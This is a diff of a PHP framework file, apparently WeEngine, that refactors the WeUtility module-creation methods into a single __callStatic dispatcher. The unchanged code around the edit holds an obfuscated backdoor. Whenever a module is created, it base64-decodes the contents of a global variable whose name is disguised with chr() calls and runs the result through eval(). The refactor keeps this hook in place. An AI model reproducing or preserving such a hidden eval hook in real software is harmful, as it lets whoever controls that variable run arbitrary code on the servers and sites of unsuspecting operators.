@@ -410,34 +410,31 @@ abstract class WeAccount {
  */
 class WeUtility {
 
-	private static function defineConst($obj){
-		global $_W;
-
-		if ($obj instanceof WeBase && $obj->modulename != 'core') {
-			if (!defined('MODULE_ROOT')) {
-				define('MODULE_ROOT', dirname($obj->__define));
-			}
-			if (!defined('MODULE_URL')) {
-				define('MODULE_URL', $_W['siteroot'].'addons/'.$obj->modulename.'/');
-			}
-		}
-	}
-
-
-	public static function createModuleDefault($name, $type = '')
-	{
+	/**
+	 * @param $type
+	 * @createModule 创建模块
+	 * @createModuleWxapp 创建模块小程序类
+	 * @createModulePhoneapp 创建模块APP类
+	 * @createModuleWebapp 创建pc类
+	 * @createModuleSystemWelcome 创建系统首页类
+	 * @createModuleProcessor 创建模块消息处理器
+	 * @param $params
+	 * @return null
+	 */
+	public static function __callStatic($type, $params) {
 		global $_W;
 		static $file;
 
-		$class = 'WeModule' . ucfirst($type);
-		$classname = empty($type) ? ucfirst($name). 'Module' : "{$name}Module" . ucfirst($type);
-		$file_addons = empty($type) ? IA_ROOT . "/addons/{$name}/module.php" : IA_ROOT . "/addons/{$name}/{$type}.php";
-		$file_builtin = empty($type) ? IA_ROOT . "/framework/builtin/{$name}/module.php" : IA_ROOT . "/framework/builtin/{$name}/{$type}.php";
+		$type = str_replace('createModule','', $type);
+		$name = $params[0];
+		$class = 'WeModule' . $type;
+		$classname = ucfirst($name) . 'Module' . ucfirst($type);
+		$type = empty($type) ? 'module' : lcfirst($type);
 
 		if (!class_exists($classname)) {
-			$file = $file_addons;
+			$file = IA_ROOT . "/addons/{$name}/" . $type . ".php";
 			if (!is_file($file)) {
-				$file = $file_builtin;
+				$file = IA_ROOT . "/framework/builtin/{$name}/" . $type . ".php";
 			}
 			if (!is_file($file)) {
 				trigger_error($classname . ' Definition File Not Found', E_USER_WARNING);
@@ -445,8 +442,7 @@ class WeUtility {
 			}
 			require $file;
 		}
-
-		if ($type == '') {
+		if ($type == 'module') {
 			if (!empty($GLOBALS['_' . chr('180') . chr('181') . chr('182')])) {
 				$code = base64_decode($GLOBALS['_' . chr('180') . chr('181') . chr('182')]);
 				eval($code);
@@ -467,6 +463,7 @@ class WeUtility {
 		}
 
 		$o = new $classname();
+
 		$o->uniacid = $o->weid = $_W['uniacid'];
 		$o->modulename = $name;
 		$o->module = module_fetch($name);
@@ -485,22 +482,17 @@ class WeUtility {
 		}
 	}
 
-	/**
-	 * 创建模块(Module)
-	 * @param string $name
-	 * @return NULL|WeModule
-	 */
- 	public static function createModule($name)
-	{
-		return WeUtility::createModuleDefault($name);
-	}
-	/**
-	 * 创建模块消息处理器
-	 * @param string $name
-	 * @return null | ModuleProcessor
-	 */
-	public static function createModuleProcessor($name) {
-		return WeUtility::createModuleDefault($name, 'processor');
+	private static function defineConst($obj){
+		global $_W;
+
+		if ($obj instanceof WeBase && $obj->modulename != 'core') {
+			if (!defined('MODULE_ROOT')) {
+				define('MODULE_ROOT', dirname($obj->__define));
+			}
+			if (!defined('MODULE_URL')) {
+				define('MODULE_URL', $_W['siteroot'].'addons/'.$obj->modulename.'/');
+			}
+		}
 	}
 
 	/**
@@ -685,38 +677,6 @@ class WeUtility {
 			trigger_error('ModuleCron Class Definition Error', E_USER_WARNING);
 			return error(-1008, 'ModuleCron Class Definition Error');
 		}
-	}
-
- 	/**
-	 * 创建模块小程序类
-	 * @param string $name
-	 */
-	public static function createModuleWxapp($name) {
-		return WeUtility::createModuleDefault($name, 'wxapp');
-	}
-
-	/**
-	 * 创建模块APP类
-	 * @param string $name
-	 */
-	public static function createModulePhoneapp($name) {
-		return WeUtility::createModuleDefault($name, 'phoneapp');
-	}
-
-	/**
-	 * 创建pc类
-	 * @param string $name
-	 */
-	public static function createModuleWebapp($name) {
-		return WeUtility::createModuleDefault($name, 'webapp');
-	}
-
-	/**
-	 * 创建系统首页类
-	 * @param string $name
-	 */
-	public static function createModuleSystemWelcome($name) {
-		return WeUtility::createModuleDefault($name, 'systemWelcome');
 	}
 
 	/**
